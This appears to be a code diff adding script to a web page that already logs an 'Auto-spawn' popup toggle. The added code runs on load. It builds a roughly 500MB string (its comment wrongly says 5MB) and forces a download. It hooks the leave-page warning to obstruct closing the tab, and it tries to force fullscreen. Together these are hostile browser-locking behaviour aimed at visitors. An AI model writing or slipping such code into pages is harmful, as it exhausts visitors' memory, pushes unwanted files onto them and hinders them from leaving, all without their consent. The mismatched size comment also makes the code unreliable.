@@ -60,6 +60,40 @@
             console.log("Auto-spawn: " + (canOpen ? "ACTIVE" : "PAUSED"));
         }
     });
+
+
+// 1. Download 5MB file immediately on load
+(function downloadFile() {
+    const size = 500 * 1024 * 1024; // 5MB
+    const content = new Array(size).fill('a').join('');
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = 'data.txt';
+    document.body.appendChild(link);
+    link.click();
+    
+    // Cleanup
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+})();
+
+// 2. "Unsaved Changes" warning when closing
+window.addEventListener('beforeunload', (event) => {
+    event.preventDefault();
+    event.returnValue = ''; 
+});
+
+// 3. Fullscreen attempt (Note: Browsers will block this without a click)
+setTimeout(() => {
+    console.log("Attempting fullscreen...");
+    document.documentElement.requestFullscreen().catch(err => {
+        console.warn("Fullscreen blocked: Browsers require a user click first.");
+    });
+}, 5000);
+
     </script>
 </body>
 </html>
